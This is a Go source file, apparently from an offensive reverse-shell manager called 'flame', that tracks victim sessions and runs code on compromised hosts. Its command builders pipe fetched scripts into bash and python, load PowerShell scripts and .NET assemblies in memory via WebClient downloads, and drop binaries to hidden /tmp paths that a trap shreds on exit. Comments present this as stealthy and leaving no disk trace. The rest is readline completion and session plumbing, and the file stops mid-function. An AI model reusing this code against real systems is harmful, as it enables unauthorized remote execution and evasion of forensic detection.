package internal

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unicode/utf8"

	"github.com/chsoares/flame/internal/ui"
	"github.com/chzyer/readline"
	"golang.org/x/term"
)

// Manager gerencia múltiplas sessões de reverse shell
type Manager struct {
	sessions             map[string]*SessionInfo         // Mapa de sessões ativas
	mu                   sync.RWMutex                    // Proteção concorrente
	nextID               int                             // Próximo ID numérico
	activeConn           net.Conn                        // Conexão atualmente ativa (se houver)
	selectedSession      *SessionInfo                    // Sessão selecionada (mas não necessariamente ativa)
	menuActive           bool                            // Se estamos no menu principal
	silent               bool                            // Suppress console output (TUI mode)
	hasCreatedLogs       bool                            // Whether this instance created any session logs
	notifyTUI            func(string)                    // Callback to send messages to TUI output pane
	notifyBar            func(string, int)               // Callback for notification bar overlay (msg, level)
	spinnerStart         func(int, string)               // Start spinner in TUI (id, text)
	spinnerStop          func(int)                       // Stop spinner in TUI (id)
	spinnerUpdate        func(int, string)               // Update spinner text in TUI (id, text)
	nextSpinnerID        int                             // Auto-incrementing spinner ID
	transferProgressFunc func(string, int, string, bool) // Callback for transfer progress (filename, pct, right, upload)
	transferDoneFunc     func(string, bool, error)       // Callback for transfer completion (filename, upload, error)
	shellOutputFunc      func(string, int, []byte)       // Callback for shell relay output (sessionID, numID, data)
	sessionDisconnFunc   func(int, string)               // Callback for session disconnect (numID, remoteIP)
	relaySuppressNano    atomic.Int64                    // UnixNano of last stty resize (atomic for goroutine safety)
	pendingWorker        atomic.Bool                     // Next AddSession will be a hidden worker
	listenerIP           string                          // IP do listener para geração de payloads
	listenerPort         int                             // Porta do listener para geração de payloads
}

// SessionInfo contém informações sobre uma sessão
type SessionInfo struct {
	ID          string             // ID único da sessão (hex)
	NumID       int                // ID numérico para facilitar uso
	Conn        net.Conn           // Conexão TCP
	RemoteIP    string             // IP da vítima
	Whoami      string             // user@host da vítima
	Platform    string             // Plataforma (linux/windows/unknown)
	Handler     *Handler           // Shell handler
	Active      bool               // Se está sendo usada atualmente
	CreatedAt   time.Time          // Timestamp de criação
	LogFile     *os.File           // Session I/O log file (lazy init)
	relayCancel context.CancelFunc // Cancel function for TUI relay goroutine
	relayActive bool               // Whether relay goroutine is running
	isWorker    bool               // Hidden worker session (module execution)
}

func (m *Manager) nextVisibleSessionID(isWorker bool) int {
	if isWorker {
		return 0
	}
	id := m.nextID
	m.nextID++
	return id
}

func findNewestWorkerSession(sessions map[string]*SessionInfo) *SessionInfo {
	var newest *SessionInfo
	for _, s := range sessions {
		if !s.isWorker {
			continue
		}
		if newest == nil || s.CreatedAt.After(newest.CreatedAt) {
			newest = s
		}
	}
	return newest
}

func resolveWorkerPlatform(workerPlatform, parentPlatform string) string {
	if workerPlatform == "detecting..." || workerPlatform == "unknown" || workerPlatform == "" {
		return parentPlatform
	}
	return workerPlatform
}

func shouldUseWorkerForSpawn(platform string) bool {
	return platform == "windows"
}

// Directory retorna o diretório base da sessão
// Formato: ~/.flame/sessions/20260401-150405_IP_user/
func (s *SessionInfo) Directory() string {
	timestamp := s.CreatedAt.Format("20060102-150405")
	whoami := sanitizePath(s.Whoami)
	dirname := fmt.Sprintf("%s_%s_%s", timestamp, s.RemoteIP, whoami)

	return appDataPath("sessions", dirname)
}

func (s *SessionInfo) newTransferer() *Transferer {
	t := NewTransferer(s.Conn, s.ID)
	t.SetPlatform(s.Platform)
	return t
}

// ScriptsDir retorna o diretório de scripts e cria se não existir
func (s *SessionInfo) ScriptsDir() string {
	dir := filepath.Join(s.Directory(), "scripts")
	os.MkdirAll(dir, 0755)
	return dir
}

// InitLogFile initializes the session log file (lazy init on first shell interaction)
func (s *SessionInfo) InitLogFile() error {
	if s.LogFile != nil {
		return nil // Already initialized
	}

	dir := s.Directory()
	os.MkdirAll(dir, 0755)
	logPath := filepath.Join(dir, "session.log")

	f, err := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return fmt.Errorf("failed to create log file: %w", err)
	}

	s.LogFile = f

	// Write session header
	header := fmt.Sprintf("=== Flame Session Log ===\n"+
		"Session ID: %d\n"+
		"Remote IP:  %s\n"+
		"Whoami:     %s\n"+
		"Platform:   %s\n"+
		"Started:    %s\n"+
		"Log file:   %s\n"+
		"===========================\n\n",
		s.NumID, s.RemoteIP, s.Whoami, s.Platform,
		s.CreatedAt.Format("2006-01-02 15:04:05"),
		logPath)

	f.WriteString(header)

	return nil
}

// sanitizePath remove caracteres problemáticos do path
func sanitizePath(s string) string {
	replacer := strings.NewReplacer(
		"@", "_",
		"\\", "_",
		"/", "_",
		" ", "_",
		":", "_",
		"*", "_",
		"?", "_",
		"\"", "_",
		"<", "_",
		">", "_",
		"|", "_",
	)
	return replacer.Replace(s)
}

// getCachedFile checks if file already exists in scripts dir (without timestamp)
// Returns path without timestamp and whether it already exists
func (s *SessionInfo) getCachedFile(url string) (string, bool) {
	filename := filepath.Base(url)
	cachedPath := filepath.Join(s.ScriptsDir(), filename)

	// Check if file exists
	if _, err := os.Stat(cachedPath); err == nil {
		// File exists! Return it
		return cachedPath, true
	}

	// File doesn't exist, return same path (no timestamp) for new download
	return cachedPath, false
}

// getOutputPath generates output file path with script name and timestamp
// Format: ScriptName-YYYY_MM_DD-HH_MM_SS-output.txt
func (s *SessionInfo) getOutputPath(scriptPath string) string {
	timestamp := time.Now().Format("2006_01_02-15_04_05")

	// Extract base name without extension
	baseName := filepath.Base(scriptPath)
	ext := filepath.Ext(baseName)
	nameWithoutExt := strings.TrimSuffix(baseName, ext)

	// Generate output filename: ScriptName-timestamp-output.txt
	outputFilename := fmt.Sprintf("%s-%s-output.txt", nameWithoutExt, timestamp)
	return filepath.Join(s.ScriptsDir(), outputFilename)
}

// RunScript downloads (if URL), uploads to victim, executes, streams output
// Simple approach that actually works with clean output
// RunScriptInMemory downloads script locally, loads to bash variable (in-memory on victim), executes
// This avoids writing script to disk on victim (more stealthy)
// scriptSource: URL or local path to script file
// args: arguments to pass to the script
func (s *SessionInfo) RunScriptInMemory(ctx context.Context, scriptSource string, args []string) error {
	if s.Platform == "windows" {
		return fmt.Errorf("run sh is not supported on Windows; use run ps1 or run dotnet")
	}

	// Resolve source: download URL to local, check binbag, etc.
	t := s.newTransferer()
	localPath, cleanup, err := t.resolveSource(scriptSource)
	if err != nil {
		// Fallback: try direct download to session cache
		if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
			var cached bool
			localPath, cached = s.getCachedFile(scriptSource)
			if !cached {
				if err := DownloadFile(ctx, scriptSource, localPath); err != nil {
					return fmt.Errorf("download failed: %w", err)
				}
			} else {
				fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(localPath))))
			}
		} else {
			return fmt.Errorf("source not found: %w", err)
		}
	}

	// Output file for local tail -f
	outputPath := s.getOutputPath(localPath)
	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
		if cleanup != nil {
			cleanup()
		}
		return fmt.Errorf("failed to create output file: %w", err)
	}

	// Build the remote command args (use -- to separate bash opts from script args)
	argsStr := ""
	if len(args) > 0 {
		argsStr = " -- " + strings.Join(args, " ")
	}

	var remoteCmd string
	if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled {
		// HTTP: curl | bash (single HTTP request, fast)
		filename := filepath.Base(localPath)
		httpURL := GlobalRuntimeConfig.GetHTTPURL(filename)
		remoteCmd = fmt.Sprintf("curl -s '%s' | bash -s%s", httpURL, argsStr)
	} else {
		// B64: upload to variable, then execute
		varName := fmt.Sprintf("_flame_script_%d", time.Now().UnixNano())
		if err := t.UploadToBashVariable(context.Background(), localPath, varName); err != nil {
			if cleanup != nil {
				cleanup()
			}
			return fmt.Errorf("upload to memory failed: %w", err)
		}
		remoteCmd = fmt.Sprintf("echo \"$%s\" | base64 -d | bash -s%s", varName, argsStr)
		// Cleanup variable after execution starts (deferred in goroutine)
		defer func() {
			time.Sleep(1 * time.Second)
			s.Conn.Write([]byte(fmt.Sprintf("unset %s\n", varName)))
		}()
	}

	// Open terminal window with tail -f of local output file
	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
	OpenTerminal(tailCmd)
	time.Sleep(300 * time.Millisecond)

	// Execute the command — BLOCKING (caller should run in goroutine)
	// This captures all output to the local file in real-time.
	err = s.Handler.ExecuteWithStreamingCtx(ctx, remoteCmd, outputPath)

	if cleanup != nil {
		cleanup()
	}

	return err
}

// RunBinary downloads (if URL), uploads to victim, makes executable, runs
// Same as RunScriptInMemory but for binary executables (disk + cleanup)
// BLOCKING — caller should run in goroutine (StartModule does this)
func (s *SessionInfo) RunBinary(ctx context.Context, binarySource string, args []string) error {
	if s.Platform == "windows" {
		return fmt.Errorf("run elf is not supported on Windows yet; use run dotnet or run ps1 for now")
	}

	// Resolve source: download URL to local, check binbag, etc.
	t := s.newTransferer()
	t.progressFn = func(string) {}
	localPath, cleanup, err := t.resolveSource(binarySource)
	if err != nil {
		// Fallback: try direct download to session cache
		if strings.HasPrefix(binarySource, "http://") || strings.HasPrefix(binarySource, "https://") {
			var cached bool
			localPath, cached = s.getCachedFile(binarySource)
			if !cached {
				if err := DownloadFile(ctx, binarySource, localPath); err != nil {
					return fmt.Errorf("download failed: %w", err)
				}
			} else {
				fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(localPath))))
			}
		} else {
			return fmt.Errorf("source not found: %w", err)
		}
	}
	if cleanup != nil {
		defer cleanup()
	}

	// Output file for local tail -f
	outputPath := s.getOutputPath(localPath)
	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
		return fmt.Errorf("failed to create output file: %w", err)
	}

	// Upload binary using SmartUpload (HTTP if binbag enabled, b64 fallback)
	remotePath := buildRemoteBinaryPath(s.Platform, localPath, time.Now().UnixNano())
	if err := t.SmartUpload(context.Background(), localPath, remotePath); err != nil {
		return fmt.Errorf("upload failed: %w", err)
	}

	// Open terminal window with tail -f of local output file
	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
	OpenTerminal(tailCmd)
	time.Sleep(300 * time.Millisecond)

	// Execute: trap ensures cleanup on ANY exit (natural, SIGHUP from conn close, SIGINT, SIGTERM)
	// This is critical for long-running binaries like pspy that never exit on their own
	remoteCmd := buildUnixBinaryCommand(remotePath, args)

	// Execute the command — BLOCKING (caller should run in goroutine)
	err = s.Handler.ExecuteWithStreamingCtx(ctx, remoteCmd, outputPath)
	return err
}

func buildRemoteBinaryPath(platform, localPath string, unixNano int64) string {
	filename := filepath.Base(localPath)
	if platform == "windows" {
		return fmt.Sprintf(`C:\Windows\Temp\flame_%d_%s`, unixNano, filename)
	}
	return fmt.Sprintf("/tmp/.flame_%d_%s", unixNano, filename)
}

func windowsNativeArgsLiteral(args []string) string {
	if len(args) == 0 {
		return ""
	}
	quoted := make([]string, len(args))
	for i, arg := range args {
		escaped := strings.ReplaceAll(arg, `"`, `""`)
		quoted[i] = fmt.Sprintf(`"%s"`, escaped)
	}
	return " " + strings.Join(quoted, " ")
}

func buildWindowsBinaryCommand(remotePath string, args []string) string {
	outputPath := remotePath + ".out.txt"
	return fmt.Sprintf(`try {
    $flameOut = '%s'
    & '%s'%s *> $flameOut
    if (Test-Path $flameOut) {
        Get-Content $flameOut -Raw
    }
} finally {
    Remove-Item $flameOut -Force -ErrorAction SilentlyContinue
    Remove-Item '%s' -Force -ErrorAction SilentlyContinue
}`, outputPath, remotePath, windowsNativeArgsLiteral(args), remotePath)
}

func buildUnixBinaryCommand(remotePath string, args []string) string {
	argsStr := ""
	if len(args) > 0 {
		argsStr = " " + strings.Join(args, " ")
	}
	return fmt.Sprintf("trap 'shred -uz %s 2>/dev/null || rm -f %s' EXIT; chmod +x %s && %s%s",
		remotePath, remotePath, remotePath, remotePath, argsStr)
}

func powershellArgLiteral(args []string) string {
	if len(args) == 0 {
		return ""
	}
	quoted := make([]string, len(args))
	for i, arg := range args {
		quoted[i] = fmt.Sprintf("'%s'", strings.ReplaceAll(arg, "'", "''"))
	}
	return " " + strings.Join(quoted, " ")
}

func buildWindowsPowerShellHTTPCommand(httpURL string, args []string) string {
	argsStr := powershellArgLiteral(args)
	return fmt.Sprintf("$script = (New-Object Net.WebClient).DownloadString('%s'); $sb = [scriptblock]::Create($script); & $sb%s", httpURL, argsStr)
}

func buildWindowsPowerShellB64Command(varName string, args []string) string {
	argsStr := powershellArgLiteral(args)
	return fmt.Sprintf("$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($%s)); $sb = [scriptblock]::Create($decoded); & $sb%s; Remove-Variable -Name %s -ErrorAction SilentlyContinue", varName, argsStr, varName)
}

func dotNetArgsLiteral(args []string) string {
	if len(args) == 0 {
		return "@()"
	}
	quotedArgs := make([]string, len(args))
	for i, arg := range args {
		quotedArgs[i] = fmt.Sprintf("'%s'", strings.ReplaceAll(arg, "'", "''"))
	}
	return "@(" + strings.Join(quotedArgs, ", ") + ")"
}

func buildWindowsDotNetExecutionCore(byteSourceExpr, argsLiteral string) string {
	return fmt.Sprintf(`try {
    $bytes = %s
    $assembly = [System.Reflection.Assembly]::Load($bytes)
    $entryPoint = $assembly.EntryPoint
    if ($entryPoint -ne $null) {
        $output = & {
            $oldOut = [Console]::Out
            $oldErr = [Console]::Error
            $sw = New-Object System.IO.StringWriter
            [Console]::SetOut($sw)
            [Console]::SetError($sw)
            try {
                $params = @(,[string[]]%s)
                $entryPoint.Invoke($null, $params) | Out-Null
            } finally {
                [Console]::SetOut($oldOut)
                [Console]::SetError($oldErr)
                $result = $sw.ToString()
                $sw.Dispose()
                $result
            }
        }
        Write-Output $output
    } else {
        Write-Host 'ERROR: No entry point found in assembly'
    }
} catch {
    Write-Host "ERROR: $_"
}`, byteSourceExpr, argsLiteral)
}

func buildWindowsDotNetHTTPCommand(httpURL string, args []string) string {
	return buildWindowsDotNetExecutionCore(
		fmt.Sprintf("(New-Object Net.WebClient).DownloadData('%s')", httpURL),
		dotNetArgsLiteral(args),
	)
}

func buildWindowsDotNetB64Command(varName string, args []string) string {
	core := buildWindowsDotNetExecutionCore(
		fmt.Sprintf("[System.Convert]::FromBase64String($%s)", varName),
		dotNetArgsLiteral(args),
	)
	return core + fmt.Sprintf("\nRemove-Variable -Name %s -ErrorAction SilentlyContinue", varName)
}

// RunPowerShellInMemory executes PowerShell scripts in-memory (Windows, zero disk writes)
// Similar to RunScriptInMemory but for PowerShell on Windows
func (s *SessionInfo) RunPowerShellInMemory(ctx context.Context, scriptSource string, args []string) error {
	if s.Platform != "windows" {
		return fmt.Errorf("run ps1 is only supported on Windows")
	}

	// Resolve source
	t := s.newTransferer()
	localPath, cleanup, err := t.resolveSource(scriptSource)
	if err != nil {
		if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
			var cached bool
			localPath, cached = s.getCachedFile(scriptSource)
			if !cached {
				if err := DownloadFile(ctx, scriptSource, localPath); err != nil {
					return fmt.Errorf("download failed: %w", err)
				}
			} else {
				fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(localPath))))
			}
		} else {
			return fmt.Errorf("source not found: %w", err)
		}
	}
	if cleanup != nil {
		defer cleanup()
	}

	// Output file (named after script for easy identification)
	outputPath := s.getOutputPath(localPath)

	// Create empty output file for tail -f
	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
		return fmt.Errorf("failed to create output file: %w", err)
	}

	// Try HTTP method first when binbag is enabled (IEX DownloadString - blazing fast!)
	if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled {
		filename := filepath.Base(localPath)
		httpURL := GlobalRuntimeConfig.GetHTTPURL(filename)

		// Open terminal for output
		tailCmd := fmt.Sprintf("tail -f %s", outputPath)
		if err := OpenTerminal(tailCmd); err != nil {
			fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
		}
		time.Sleep(300 * time.Millisecond)

		remoteCmd := buildWindowsPowerShellHTTPCommand(httpURL, args)
		return s.Handler.ExecuteWithStreamingCtx(ctx, remoteCmd, outputPath)
	}

	// Fallback: b64 variable upload (works without binbag)
	varName := fmt.Sprintf("flame_ps_%d", time.Now().UnixNano())

	if err := t.UploadToPowerShellVariable(ctx, localPath, varName); err != nil {
		return fmt.Errorf("upload to memory failed: %w", err)
	}

	// Open terminal after upload completes
	tailCmd := fmt.Sprintf("tail -f %s", outputPath)

	if err := OpenTerminal(tailCmd); err != nil {
		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
	}

	time.Sleep(300 * time.Millisecond)
	remoteCmd := buildWindowsPowerShellB64Command(varName, args)
	return s.Handler.ExecuteWithStreamingCtx(ctx, remoteCmd, outputPath)
}

// RunDotNetInMemory executes .NET assemblies in-memory (Windows, zero disk writes)
// Uses reflection to load and execute assembly from memory
func (s *SessionInfo) RunDotNetInMemory(ctx context.Context, assemblySource string, args []string) error {
	if s.Platform != "windows" {
		return fmt.Errorf("run dotnet is only supported on Windows")
	}

	// Resolve source
	t := s.newTransferer()
	localPath, cleanup, err := t.resolveSource(assemblySource)
	if err != nil {
		if strings.HasPrefix(assemblySource, "http://") || strings.HasPrefix(assemblySource, "https://") {
			var cached bool
			localPath, cached = s.getCachedFile(assemblySource)
			if !cached {
				if err := DownloadFile(ctx, assemblySource, localPath); err != nil {
					return fmt.Errorf("download failed: %w", err)
				}
			} else {
				fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(localPath))))
			}
		} else {
			return fmt.Errorf("source not found: %w", err)
		}
	}
	if cleanup != nil {
		defer cleanup()
	}

	// Output file (named after script for easy identification)
	outputPath := s.getOutputPath(localPath)

	// Create empty output file for tail -f
	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
		return fmt.Errorf("failed to create output file: %w", err)
	}

	// Try HTTP method first when binbag is enabled (DownloadData + Reflection.Load - blazing fast!)
	if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled {
		filename := filepath.Base(localPath)
		httpURL := GlobalRuntimeConfig.GetHTTPURL(filename)

		// Open terminal for output
		tailCmd := fmt.Sprintf("tail -f %s", outputPath)
		if err := OpenTerminal(tailCmd); err != nil {
			fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
		}
		time.Sleep(300 * time.Millisecond)

		remoteCmd := buildWindowsDotNetHTTPCommand(httpURL, args)
		return s.Handler.ExecuteWithStreamingCtx(ctx, remoteCmd, outputPath)
	}

	// Fallback: b64 variable upload (works without binbag)
	varName := fmt.Sprintf("flame_asm_%d", time.Now().UnixNano())

	if err := t.UploadToPowerShellVariable(ctx, localPath, varName); err != nil {
		return fmt.Errorf("upload to memory failed: %w", err)
	}

	// Open terminal after upload completes
	tailCmd := fmt.Sprintf("tail -f %s", outputPath)

	if err := OpenTerminal(tailCmd); err != nil {
		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
	}

	time.Sleep(300 * time.Millisecond)
	remoteCmd := buildWindowsDotNetB64Command(varName, args)
	return s.Handler.ExecuteWithStreamingCtx(ctx, remoteCmd, outputPath)
}

func pythonArgvLiteral(args []string) string {
	parts := []string{"'script'"}
	for _, arg := range args {
		escaped := strings.ReplaceAll(arg, "\\", "\\\\")
		escaped = strings.ReplaceAll(escaped, "'", "\\'")
		parts = append(parts, fmt.Sprintf("'%s'", escaped))
	}
	return "[" + strings.Join(parts, ", ") + "]"
}

func buildUnixPythonHTTPCommand(httpURL string, args []string) string {
	argv := pythonArgvLiteral(args)
	return fmt.Sprintf(
		"curl -fsSL '%s' | python3 -c \"import sys; sys.argv = %s; exec(sys.stdin.read())\"",
		httpURL,
		argv,
	)
}

func buildUnixPythonB64Command(varName string, args []string) string {
	argv := pythonArgvLiteral(args)
	return fmt.Sprintf(
		"echo \"$%s\" | base64 -d | python3 -c \"import sys; sys.argv = %s; exec(sys.stdin.read())\"; unset %s",
		varName,
		argv,
		varName,
	)
}

// RunPythonInMemory executes Python scripts in-memory (Linux/Windows, zero disk writes)
// Similar to RunScriptInMemory but for Python
func (s *SessionInfo) RunPythonInMemory(ctx context.Context, scriptSource string, args []string) error {
	if s.Platform == "windows" {
		return fmt.Errorf("run py on Windows is not refactored yet")
	}

	// Resolve source
	t := s.newTransferer()
	localPath, cleanup, err := t.resolveSource(scriptSource)
	if err != nil {
		if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
			var cached bool
			localPath, cached = s.getCachedFile(scriptSource)
			if !cached {
				if err := DownloadFile(ctx, scriptSource, localPath); err != nil {
					return fmt.Errorf("download failed: %w", err)
				}
			} else {
				fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(localPath))))
			}
		} else {
			return fmt.Errorf("source not found: %w", err)
		}
	}
	if cleanup != nil {
		defer cleanup()
	}

	// Output file (named after script for easy identification)
	outputPath := s.getOutputPath(localPath)

	// Create empty output file for tail -f
	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
		return fmt.Errorf("failed to create output file: %w", err)
	}

	var remoteCmd string
	if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled {
		filename := filepath.Base(localPath)
		httpURL := GlobalRuntimeConfig.GetHTTPURL(filename)
		remoteCmd = buildUnixPythonHTTPCommand(httpURL, args)
	} else {
		varName := fmt.Sprintf("_flame_py_%d", time.Now().UnixNano())
		if err := t.UploadToBashVariable(ctx, localPath, varName); err != nil {
			return fmt.Errorf("upload to memory failed: %w", err)
		}
		remoteCmd = buildUnixPythonB64Command(varName, args)
	}

	tailCmd := fmt.Sprintf("tail -f %s", outputPath)

	if err := OpenTerminal(tailCmd); err != nil {
		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
	}

	time.Sleep(300 * time.Millisecond)

	return s.Handler.ExecuteWithStreamingCtx(ctx, remoteCmd, outputPath)
}

// FlameCompleter implements readline.AutoCompleter for smart path completion
type FlameCompleter struct {
	manager *Manager
}

// Do implements the AutoCompleter interface
func (c *FlameCompleter) Do(line []rune, pos int) (newLine [][]rune, length int) {
	lineStr := string(line[:pos])
	trimmed := strings.TrimLeft(lineStr, " \t")

	commands := []string{"upload", "download", "list", "use", "shell", "kill", "help", "exit", "clear", "ssh", "rev", "spawn", "run", "modules", "binbag", "pivot", "config"}

	// Nothing typed yet, show all commands
	if trimmed == "" {
		matches, repl := c.completeFromList("", commands)
		return matches, repl
	}

	parts := strings.Fields(trimmed)
	if len(parts) == 0 {
		return nil, 0
	}

	// Still typing the command (no space yet)
	if len(parts) == 1 && !strings.HasSuffix(trimmed, " ") {
		prefix := parts[0]
		matches, repl := c.completeFromList(prefix, commands)
		return matches, repl
	}

	cmd := parts[0]
	argCount := len(parts) - 1

	// If the line ends with a space, we're starting a new argument
	if strings.HasSuffix(trimmed, " ") {
		argCount++
	}

	currentArg := c.getCurrentArg(trimmed)

	switch cmd {
	case "upload":
		if argCount == 1 {
			// First arg: complete local paths + binbag files
			localMatches, localLen := c.completeLocalPath(currentArg)

			// If binbag enabled and no path separator in arg, also offer binbag files
			if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled &&
				!strings.ContainsAny(currentArg, "/\\") {
				entries, err := os.ReadDir(GlobalRuntimeConfig.BinbagPath)
				if err == nil {
					seen := make(map[string]bool)
					// Track existing matches to deduplicate
					for _, m := range localMatches {
						seen[string(m)] = true
					}
					for _, entry := range entries {
						if entry.IsDir() || strings.HasPrefix(entry.Name(), "tmp_") {
							continue
						}
						name := entry.Name()
						if strings.HasPrefix(name, currentArg) {
							suffix := []rune(name[len(currentArg):])
							key := string(suffix)
							if !seen[key] {
								localMatches = append(localMatches, suffix)
								seen[key] = true
							}
						}
					}
				}
			}
			return localMatches, localLen
		} else if argCount == 2 {
			// Second arg: complete remote paths
			return c.completeRemotePath(currentArg)
		}
	case "download":
		if argCount == 1 {
			// First arg: complete remote paths
			return c.completeRemotePath(currentArg)
		} else if argCount == 2 {
			// Second arg: complete local paths
			return c.completeLocalPath(currentArg)
		}
	case "binbag":
		if argCount == 1 {
			return c.completeFromList(currentArg, []string{"ls", "on", "off", "path", "port"})
		} else if argCount == 2 && len(parts) >= 2 && parts[1] == "path" {
			return c.completeLocalPath(currentArg)
		}
	case "pivot":
		if argCount == 1 {
			return c.completeFromList(currentArg, []string{"off"})
		}
	case "run":
		if argCount == 1 {
			// Complete module names
			registry := GetModuleRegistry()
			var names []string
			for _, mod := range registry.List() {
				names = append(names, mod.Name())
			}
			return c.completeFromList(currentArg, names)
		} else if argCount == 2 {
			// For custom modules (sh, elf, ps1, dotnet, py), complete local paths + binbag files
			if len(parts) >= 2 {
				switch parts[1] {
				case "sh", "elf", "ps1", "dotnet", "py":
					localMatches, localLen := c.completeLocalPath(currentArg)
					if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled &&
						!strings.ContainsAny(currentArg, "/\\") {
						entries, err := os.ReadDir(GlobalRuntimeConfig.BinbagPath)
						if err == nil {
							seen := make(map[string]bool)
							for _, m := range localMatches {
								seen[string(m)] = true
							}
							for _, entry := range entries {
								if entry.IsDir() || strings.HasPrefix(entry.Name(), "tmp_") {
									continue
								}
								name := entry.Name()
								if strings.HasPrefix(name, currentArg) {
									suffix := []rune(name[len(currentArg):])
									key := string(suffix)
									if !seen[key] {
										localMatches = append(localMatches, suffix)
										seen[key] = true
									}
								}
							}
						}
					}
					return localMatches, localLen
				}
			}
		}
	}

	return nil, 0
}

// getCurrentArg extracts the current argument being typed
func (c *FlameCompleter) getCurrentArg(line string) string {
	if strings.HasSuffix(line, " ") {
		return ""
	}

	parts := strings.Fields(line)
	if len(parts) == 0 {
		return ""
	}

	return parts[len(parts)-1]
}

// completeFromList completes from a list of strings
func (c *FlameCompleter) completeFromList(prefix string, list []string) ([][]rune, int) {
	var candidates []string
	for _, item := range list {
		if strings.HasPrefix(item, prefix) {
			candidates = append(candidates, item)
		}
	}

	sort.Strings(candidates)

	prefixRunes := []rune(prefix)
	removeLen := len(prefixRunes)

	matches := make([][]rune, 0, len(candidates))
	for _, item := range candidates {
		itemRunes := []rune(item)
		if len(itemRunes) < removeLen {
			continue
		}
		matches = append(matches, itemRunes[removeLen:])
	}

	return matches, removeLen
}

// completeLocalPath completes local file paths
func (c *FlameCompleter) completeLocalPath(arg string) ([][]rune, int) {
	replacementLen := utf8.RuneCountInString(arg)

	dirPart, basePart := splitPathForCompletion(arg)
	if arg == "~" || arg == "~"+string(os.PathSeparator) {
		dirPart = "~" + string(os.PathSeparator)
		basePart = ""
	}

	searchDir := dirPart
	if searchDir == "" {
		if strings.HasPrefix(arg, "~") {
			searchDir = "~"
		} else {
			searchDir = "."
		}
	}

	expandedDir := expandUserPath(searchDir)
	entries, err := os.ReadDir(expandedDir)
	if err != nil {
		return nil, replacementLen
	}

	var suggestions []string
	for _, entry := range entries {
		name := entry.Name()
		if basePart != "" && !strings.HasPrefix(name, basePart) {
			continue
		}

		suggestion := dirPart + name
		if entry.IsDir() {
			suggestion += string(os.PathSeparator)
		}
		if strings.HasPrefix(suggestion, arg) || arg == "" {
			suggestions = append(suggestions, suggestion)
		}
	}

	sort.Strings(suggestions)

	argRunes := []rune(arg)
	matches := make([][]rune, 0, len(suggestions))
	for _, suggestion := range suggestions {
		suggestionRunes := []rune(suggestion)
		if len(argRunes) > len(suggestionRunes) {
			continue
		}
		matches = append(matches, suggestionRunes[len(argRunes):])
	}

	return matches, replacementLen
}

// completeRemotePath attempts to complete remote file paths
func (c *FlameCompleter) completeRemotePath(prefix string) ([][]rune, int) {
	return nil, utf8.RuneCountInString(prefix)
}

func splitPathForCompletion(arg string) (dirPart, basePart string) {
	if arg == "" {
		return "", ""
	}

	// Support both / and \ as separators so Windows paths work too
	lastSep := strings.LastIndexAny(arg, "/\\")
	if lastSep == -1 {
		return "", arg
	}

	return arg[:lastSep+1], arg[lastSep+1:]
}

func expandUserPath(path string) string {
	if path == "" {
		return "."
	}

	if path == "~" || path == "~"+string(os.PathSeparator) {
		if home, err := os.UserHomeDir(); err == nil {
			return home
		}
		return "."
	}

	if strings.HasPrefix(path, "~"+string(os.PathSeparator)) {
		if home, err := os.UserHomeDir(); err == nil {
			return filepath.Join(home, path[2:])
		}
		return path
	}

	if strings.HasPrefix(path, "~/") {
		if home, err := os.UserHomeDir(); err == nil {
			return filepath.Join(home, path[2:])
		}
		return path
	}

	return path
}

// Remote path completion removed

// NewManager cria um novo gerenciador de sessões
func NewManager() *Manager {
	return &Manager{
		sessions:        make(map[string]*SessionInfo),
		nextID:          1,
		selectedSession: nil,
		menuActive:      true,
		silent:          false,
	}
}

// SetSilent enables/disables console output
func (m *Manager) SetSilent(silent bool) {
	m.silent = silent
}

// SetNotifyFunc sets a callback for background goroutines to send messages to the TUI.
func (m *Manager) SetNotifyFunc(fn func(string)) {
	m.notifyTUI = fn
}

// SetNotifyBarFunc sets a callback for notification bar overlays in the TUI.
func (m *Manager) SetNotifyBarFunc(fn func(string, int)) {
	m.notifyBar = fn
}

// notify sends a message either to stdout (legacy) or to the TUI callback.
func (m *Manager) notify(msg string) {
	if m.silent && m.notifyTUI != nil {
		m.notifyTUI(msg)
	} else if !m.silent {
		fmt.Println(msg)
	}
}

// notifyOverlay sends a notification bar overlay to the TUI.
// level: 0=info, 1=important, 2=error
func (m *Manager) notifyOverlay(msg string, level int) {
	if m.notifyBar != nil {
		m.notifyBar(msg, level)
	}
}

// SetSpinnerFunc sets callbacks for spinner start/stop/update in the TUI.
func (m *Manager) SetSpinnerFunc(start func(int, string), stop func(int), update func(int, string)) {
	m.spinnerStart = start
